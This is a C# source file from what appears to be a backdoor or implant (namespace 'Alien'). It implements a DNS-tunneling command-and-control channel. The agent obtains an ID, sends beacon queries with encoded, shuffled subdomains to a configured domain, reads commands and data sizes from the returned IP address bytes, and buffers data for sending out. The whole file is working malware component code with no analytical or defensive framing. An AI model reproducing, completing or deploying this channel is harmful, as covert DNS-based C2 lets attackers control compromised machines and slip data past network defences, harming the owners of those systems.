using System;
using System.Linq;
using System.Net;

namespace Alien
{
	internal class DnsClass
	{
		public static MachineCommand Alive()
		{
			MachineCommand ret = MachineCommand.Failed;
			if (Config.GetAgentID() != null || DnsClass._TryMe(new Func<bool>(DnsClass._FirstAlive)))
			{
				DnsClass._TryMe(() => DnsClass._MainAlive(out ret));
			}
			Util.Log(string.Format("Alive : {0}", ret));
			return ret;
		}
		private static bool _TryMe(Func<bool> fn)
		{
			bool result = false;
			DnsClass._Try = 0;
			while (!fn() && DnsClass._Try < Config.MaxTry)
			{
				Util.MakeDelay(1);
			}
			if (DnsClass._Try >= Config.MaxTry)
			{
				DnsClass._Try = 0;
				Config.IncreaseCounter();
			}
			else
			{
				result = true;
			}
			return result;
		}
		private static bool _FirstAlive()
		{
			DnsClass._DomainMaker(Enums.DomainType.FirstAlive, Config.FirstAliveKey);
			byte[] array;
			bool flag = DnsClass._Resolver(out array);
			if (flag)
			{
				Config.SetAgentID((int)array[3]);
			}
			return flag;
		}
		private static bool _MainAlive(out MachineCommand ret)
		{
			DnsClass._DomainMaker(Enums.DomainType.MainAlive, string.Empty);
			ret = MachineCommand.Failed;
			byte[] response;
			bool flag = DnsClass._Resolver(out response);
			if (flag && DnsClass._InitReceive(response))
			{
				ret = MachineCommand.HasData;
			}
			return flag;
		}
		private static bool _InitReceive(byte[] response)
		{
			if (response[0] >= 128)
			{
				DnsClass._ReceiveByteIndex = 0;
				DnsClass._ReceiveDataSize = Util.GetInt(response.Skip(1).Take(3).ToArray<byte>());
				DnsClass._ReceiveData = new byte[DnsClass._ReceiveDataSize];
				return true;
			}
			return false;
		}

		private static void _DomainMaker(Enums.DomainType domainType, string data)
		{
			if (DnsClass._Try == 0)
			{
				if (domainType == Enums.DomainType.MainAlive)
				{
					DnsClass._Domain = Util.ConvertIntToDomain(Config.GetAgentID().Value);
				}
				else if (domainType == Enums.DomainType.FirstAlive)
				{
					DnsClass._Domain = Util.ConvertIntToDomain((int)domainType) + data;
				}
				else
				{
					DnsClass._Domain = Util.ConvertIntToDomain((int)domainType) + Util.ConvertIntToDomain(Config.GetAgentID().Value) + data;
				}
				string shuffle = Util.Shuffle(Config.GetCounter());
				DnsClass._Domain = Util.MapBaseSubdomainCharacters(DnsClass._Domain, shuffle) + Util.ConvertIntToCounter(Config.GetCounter()).PadLeft(3, Config.CharsCounter[0]) + "." + Config.GetDomain();
			}
		}

		private static bool _Resolver(out byte[] response)
		{
			bool result = true;
			response = null;
			try
			{
				Util.Log(DnsClass._Domain);
				IPHostEntry iphostEntry = Dns.Resolve(DnsClass._Domain);
				response = iphostEntry.AddressList[0].GetAddressBytes();
				DnsClass._Try = 0;
				Config.IncreaseCounter();
			}
			catch
			{
				DnsClass._Try++;
				result = false;
			}
			return result;
		}

		public static void ReadySend(byte[] sendData)
		{
			DnsClass._SendByteIndex = 0;
			DnsClass._SendDataSize = sendData.Length;
			DnsClass._SendData = sendData;
		}

		
		private static string _Domain;
		private static int _Try;
		private static int _ReceiveDataSize;
		private static int _ReceiveByteIndex;
		private static byte[] _ReceiveData;
		private static int _SendDataSize;
		private static int _SendByteIndex;
		private static byte[] _SendData;
	}
}
